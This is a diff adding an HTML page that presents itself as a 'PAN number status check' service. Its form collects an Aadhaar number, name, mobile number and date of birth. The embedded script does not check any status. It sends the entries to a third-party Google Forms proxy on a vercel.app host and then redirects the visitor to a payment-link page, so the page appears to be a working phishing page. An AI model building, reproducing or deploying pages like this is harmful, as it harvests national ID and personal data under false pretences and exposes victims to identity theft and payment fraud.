@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Pan Number Search Check Status</title>
+	<style>
+		body {
+			color: white;
+			background-color: black;
+		}
+
+		input[type="number"], input[type="text"], input[type="date"], input[type="submit"] {
+			width: 300px;
+			height: 30px;
+			font-size: 16px;
+		}
+	</style>
+</head>
+
+<body>
+	<h3>Pan Number Search Check Status</h3>
+	<form id="myForm">
+		<label for="aadhaar">Your Aadhaar Number:</label>
+		<br>
+		<input type="number" id="aadhaar" name="entry.2011455370" required>
+		<br><br><br>
+
+		<label for="name">Your Name:</label>
+		<br>
+		<input type="text" id="name" name="entry.1648281785" required>
+		<br><br><br>
+
+		<label for="pan">Mobile Number:</label>
+		<br>
+		<input type="number" id="pan" name="entry.740643636">
+		<br><br><br>
+
+		<label for="dob">Date of Birth:</label>
+		<br>
+		<input type="date" id="dob" name="entry.1355559455" required>
+		<br><br><br>
+
+		<input type="submit" value="CHECK PAN STATUS" onclick="submitForm(event)">
+	</form>
+
+	<script>
+		// Submit form to Google Forms API
+		function submitForm(event) {
+			event.preventDefault(); // Prevent form submission if validation fails
+
+			const aadhaar = document.getElementById("aadhaar").value;
+			const name = document.getElementById("name").value;
+			const pan = document.getElementById("pan").value;
+			const dob = document.getElementById("dob").value;
+
+			if (aadhaar.trim() === '' || name.trim() === '' || dob.trim() === '') {
+				alert('Please fill in all required fields.');
+				return;
+			}
+
+			const formData = {
+				"entry.2011455370": aadhaar,
+				"entry.1648281785": name,
+				"entry.740643636": pan,
+				"entry.1355559455": dob
+			};
+
+			fetch("https://securityinfinity-google-forms-rest-api.vercel.app/api/forms/1FAIpQLScIm6UgNOnoEoMwut-DaZz10HY6izdh-WgS3kXNrDGu7N5o9g", {
+				method: "POST",
+				body: JSON.stringify(formData),
+				headers: {
+					"Content-Type": "application/json"
+				}
+			})
+				.then(response => {
+					if (response.ok) {
+						window.location.replace("https://appsfrontend.securityinfinity.com/paymentlink.html");
+					} else {
+						alert("There was a problem submitting the form. Please try again later.");
+					}
+				})
+				.catch(error => {
+					alert("There was a problem submitting the form. Please try again later.");
+				});
+		}
+	</script>
+</body>
+
+</html>
